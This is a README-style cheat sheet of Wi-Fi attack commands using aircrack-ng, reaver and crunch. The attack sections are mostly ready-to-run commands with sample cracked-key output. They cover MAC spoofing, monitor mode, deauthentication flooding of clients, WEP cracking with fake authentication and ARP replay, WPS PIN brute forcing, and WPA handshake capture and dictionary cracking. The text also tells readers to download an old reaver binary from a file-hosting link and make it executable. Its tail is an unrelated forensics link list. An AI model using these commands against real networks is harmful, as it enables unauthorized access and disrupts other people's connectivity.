# Network Hacking [![Link Status](https://github.com/cugu/awesome-forensics/workflows/CI/badge.svg)](https://github.com/suhailm-in/Network-Hacking)

**Network Hacking** and forensic analysis tools and resources.

- [Network Hacking ](#network-hacking-)

  - [Network Basics](#network-basics)
    - [MAC Address Changing](#mac-address-changing)
    - [Wireless Mode Changing](#wireless-mode-changing)
    - [Wireless Mode Changing ALFA](#wireless-mode-changing-alfa)
    - [Wireless Mode Changing Other Adapters](#wireless-mode-changing-other-adapters)
    

  - [Pre Connection Attacks](#pre-connection-attacks)
    - [WIFI Bands](#wifi-bands)
    - [Packet Sniffing](#packet-sniffing)
    - [Targeted Packet Sniffing](#targeted-packet-sniffing)
    - [Deauthentication Attack](#deauthentication-attack)
    - [CRUNCH WorldList](#crunch-worldlist)
    


  - [Gaining Access](#gaining-access)
    - [WEP Cracking](#wep-cracking)
    - [Fake Authentication](#fake-authentication)
    - [WPA/WPA2 Cracking WPS Enable Networks](#wpa-wpa2-cracking-wps-enable-networks)
    - [WPA/WPA2 Cracking Handshake](#wpa-wpa2-cracking-handshake)


  - [Post Connection Attacks](#post-connection-attacks)
    - [WEP Cracking](#wep-cracking)
  
  

---
## <h1>Network Basics

### MAC Address Changing 

```
ifconfig
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
ifconfig
```

- ifconfig - list all the network interfaces
- wlan0 - name of the network interfaces
- down - disable interface
- up - enable interfaces
- hw - hardware
- ether - mac address

  <br><br>
  
### Wireless Mode Changing
Managed mode - Monitor mode
- To enable Monitor mode for test packet injection

> see all interface <br>
```
ifconfig
```
> desable interface <br>
> check for any conflicting process and kill them <br>
> monitore mode enable <br>
> enable interface
```
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```
> see wireless interface only
```
iwconfig
```
  
 <br><br>

### Wireless Mode Changing ALFA
ALFA - AWUS036NHA <br>
- To enable Monitor mode for test packet injection:


>see interface
```
ip addr
iwconfig
```
>check for any conflicting process and kill them <br>
>start monitor mode <br>
>verify that monitor mode is used <br>
```
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airmon-ng
```
>you could also use iwconfig to check that interface is in monitor mode
```
iwconfig
```

  <br><br>

### Wireless Mode Changing Other Adapters
TP-Link - TL-WN722N V2/V1 OR Other Ineterfaces <br>
Managed mode - Monitor mode<br>



```
ifconfig wlan0 down
airmon-ng check kill
ifconfig wlan0 mode monitor
ifconfig wlan0mon up
iwconfig
```
> or
```
ifconfig wlan0 down
airmon-ng check kill
airmon-ng start wlan0
iwconfig
```
Driver Installing Processes <br>
> Use these commands to get the adapter working on Kali for packet injection and monitoring:
```
sudo apt update
sudo apt upgrade
sudo apt install bc
sudo apt-get install build-essential 
sudo apt-get install libelf-dev 
```
> Try either of these commands to see which works:
```
sudo apt-get install linux-headers-`uname -r`
```
> or
```
sudo apt-get install linux-headers-5.10.0-kali6-amd64
```
> Driver Installing
```
sudo apt install dkms
sudo rmmod r8188eu.ko
git clone https://github.com/aircrack-ng/rtl8188eus
cd rtl8188eus
sudo -i
echo "blacklist r8188eu" > "/etc/modprobe.d/realtek.conf"
exit
sudo reboot
sudo apt update
cd rtl8188eus
sudo make
sudo make install
sudo modprobe 8188eu
```
  
> To enable Monitor mode and test packet injection:
```
sudo ifconfig wlan0 down
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0mon up
iwconfig
```
```
sudo aireplay-ng --test wlan0mon
```
---
  
  
  <br><br><br><br>
## <h1>Pre Connection Attacks


### WIFI Bands

- besides the frequency range that can be used
- determines the channel that can be used
- clients need to support band used by a router to communicate with it
- data can be sniffed from a certain band if the wireless adapter used supports that band

***a - uses 5Ghz Frequency only <br>***
***b,g - both use 2.4Ghz Frequency only <br>***
***n - uses 5Ghz and 2.4Ghz <br>***
***ac - uses Frequencies lower than 6Gzh***

> see all 2.4Ghz Frequencies wifi bands
```
airodump-ng wlan0mon
```
> see all 5Ghz Frequencies wifi bands
```
airodump-ng --band a wlan0mon
```
> see both 2.4Ghz and 5Ghz Frequencies wifi bands
```
airodump-ng --band abg wlan0mon
```

  <br><br>

### Packet Sniffing

- **Using Airodump-ng**
- ***airodump-ng*** is part of the ***aircrack-ng***
- ***airodump-ng*** is a packet sinffer

> get the AP's MAC Address and channel
```
sudo airdump-ng wlan0mon
```

  <br><br>

### Targeted Packet Sniffing
```
airodump-ng --bssid B4:B0:24:74:21:7C --channel 1 --write testA wlan0mon

```
or
```
airodump-ng -w testA -c 1 --bssid B4:B0:24:74:21:7C wlan0mon 

```
bssid - target MAC Address <br>
channel - channel number <br>
write - file name to save <br>
wlan0mon - interface name 

  <br><br>
  
### Deauthentication Attack

- Disconnect any clint from any network
- work on encrypeted networks (WEP, WPA & WPA2)

**Open terminal - 1**
> Targeted Packet Sniffing With out SAVE
```
airodump-ng --bssid 70:97:41:DA:E0:5B --channel 6 wlan0mon 
```
**Open terminal - 2**
> Deauth attack
```
aireplay-ng --deauth 10000000 -a 70:97:41:DA:E0:5B  -c 40:49:0F:45:D7:B5 wlan0mon 
```
deauth - sending deauth packets number <br>
-a - Network MAC Address <br>
-c - Target MAC Address <br>
wlan0mon - interface name <br>

  <br><br>

### CRUNCH WorldList

syntax:
> crunch [min] [max] [characters] -t [pattern] -o [FileName]
```
crunch 6 8 abc123$ -o test.txt
```
```
crunch 6 8 abc123$ -o test.txt -t a@@@@b
```

example worldlist:-
aaaaab,
aaabbb,
aab$bb

---


<br><br><br><br>



## <h1>Gaining Access

### WEP Cracking
To crack WEP we need to:
-  Capture a large number of packets/IVs. → *airodump-ng*
-  Analyse the captured IVs and crack the key. → *aircrack-ng*
> Targeted Packet Sniffing 
```
airodump-ng --bssid 70:97:41:DA:E0:5B --channel 6 --write test wlan0mon
```
> crack that saved file [ test-01.cap ]
```
aircrack-ng test-01.cap
```
see that KEY
> KEY FOUND [41:45:76:98] [ ASCII : As23p ] <br>

Remove all colon symbol ":" in that key found [41:45:76:98]

> Password : 41457698

- Problem:
if network is not busy
it would take some time to capture enough IVs

- Solution:
force the AP to genarate new IVs (fake authentication attack)<br><br><br>
  
  <br><br>
  

### Fake Authentication
**Open terminal - 1**
> find target MAC Address and Channel <br>
> targeted packet sniffing 
```
airodump-ng wlan0mon
airodump-ng --bssid 70:97:41:DA:E0:5B --channel 6 --write test wlan0mon
```
<br>

**Open terminal - 2**
> fake authentication attack
```
aireplay-ng --fakeauth 0 -a 70:97:41:DA:E0:5B -h 48:5D:60:45:G6:25 wlan0mon
```
-a - target MAC Address <br>
-h - interface MAC Address

- Problem:
APs only communicate with connected clients.
We can’t communicate with it.
We can’t even start the attack.

- Solution:
Associate with the AP before launching the attack. ( ARP Request Replay ) 
<br>

**Open terminal - 3**
> ARP Request Replay
```
aireplay-ng --arpreplay 0 -b 70:97:41:DA:E0:5B -h 48:5D:60:45:G6:25 wlan0mon
```
see the number of data is increaing know verry verry quickly to high <br>


-b - target MAC Address <br>
-h - interface MAC Address <br>
<br>

**Open terminal - 4**
> crack that saved file [ test-01.cap ]
```
aircrack-ng test-01.cap
```
see that KEY
> KEY FOUND [41:45:76:98] [ ASCII : As23p ] <br>

Remove all colon symbol ":" in that key found [41:45:76:98]

> Password : 41457698 

<br><br>

### WPA WPA2 Cracking WPS Enable Networks
- This attaack only for work WPS enable networks

**Open terminal - 1**
> see all the WPS enable Networks <br>
> Find MAC Address and channel
```
wash --interface wlan0mon
airmon-ng wlan0mon
```
<br>

**Open terminal - 2**

> using *reaver* to do the brute forcing and cracking WPS enable network
```
reaver --bssid 70:97:41:DA:E0:5B --channel 1 --interface wlan0mon -vvv --no-associate
```
bssid - target MAC Address <br>
-vvv - show more information as possible <br>
no-associate - to tell reaver no to associate with the target network
<br>

**Open terminal - 3**
> fake authentication attack
```
aireplay-ng --fakeauth 30 -a 70:97:41:DA:E0:5B -h 48:5D:60:45:G6:25 wlan0mon
```
you can see "Terminal - 2" that wps pin is password:
> WPS PIN : '12345670' <br>
> WPS PSK : 'UAURWSXR' <br>
> AP SSID : 'Test_AP' <br>

-a - target MAC Address <br>
-h - interface MAC Address
<br>


**Error:**
Now getting an error and this is actually a bug with the last versions of reaver

**Solution:**
Use older version of reaver. it's work perfectly <br>

> [Download reaver](https://www.mediafire.com/file/9mjizwkeru2qf7x/reaver/file) - old version <br>
> change dirctory to download <br>
> change the permission of this file to an executable
```
cd download
chmod +x reaver
```
> using *reaver* old version to do the brute forcing and cracking WPS enable network
```
./reaver --bssid 70:97:41:DA:E0:5B --channel 1 --interface wlan0mon -vvv --no-associate
```

<br><br><br>



### WPA WPA2 Cracking Handshake


**Open terminal - 1**
> find target MAC Address and Channel <br>
> targeted packet sniffing 
```
airodump-ng wlan0mon
airodump-ng --bssid 70:97:41:DA:E0:5B --channel 6 --write wps_handshake wlan0mon
```
<br>

**Open terminal - 2**
> death attack - Re-connect device to that network
```
aireplay-ng --deauth 4 -a 70:97:41:DA:E0:5B -c 48:5D:60:45:G6:25 wlan0mon
```
-a - target MAC Address <br>
-c - clint MAC Address - Re-connect device to that network

**Open terminal - 3**
> Creat a world list using crunch
```
crunch 6 8 abc12 -o test.txt
```
crunch - tool name <br>
6 - minimum numbers of password <br>
8 - maximum numbers of password <br>
abc12 - character of password <br>
-o - write to file <br>
test.txt - file name <br>

> using worldlist to attack and crack file
```
aircrack-ng wpa_handshake-01.cap -w test.txt
```
KEY FOUND! [UAUERSXR] <br>
"UAUERSXR" is the password of the our target network

---


<br><br><br><br>




## Post Connection Attacks
  
  
  
  
  
  
  
  
  
  
  
  


## Collections

- [AboutDFIR – The Definitive Compendium Project](https://aboutdfir.com) - Collection of forensic resources for learning and research. Offers lists of certifications, books, blogs, challenges and more
- [DFIR.Training](https://www.dfir.training/) - Database of forensic resources focused on events, tools and more
- :star: [ForensicArtifacts.com Artifact Repository](https://github.com/ForensicArtifacts/artifacts) - Machine-readable knowledge base of forensic artifacts

## Tools

- [Forensics tools on Wikipedia](https://en.wikipedia.org/wiki/List_of_digital_forensics_tools)
- [Eric Zimmerman's Tools](https://ericzimmerman.github.io/#!index.md)

### Distributions

- [bitscout](https://github.com/vitaly-kamluk/bitscout) - LiveCD/LiveUSB for remote forensic acquisition and analysis
- [Remnux](https://remnux.org/) - Distro for reverse-engineering and analyzing malicious software
- [SANS Investigative Forensics Toolkit (sift)](https://github.com/teamdfir/sift) - Linux distribution for forensic analysis
- [Tsurugi Linux](https://tsurugi-linux.org/) - Linux distribution for forensic analysis
- [WinFE](https://www.winfe.net/home) - Windows Forensics enviroment

### Frameworks
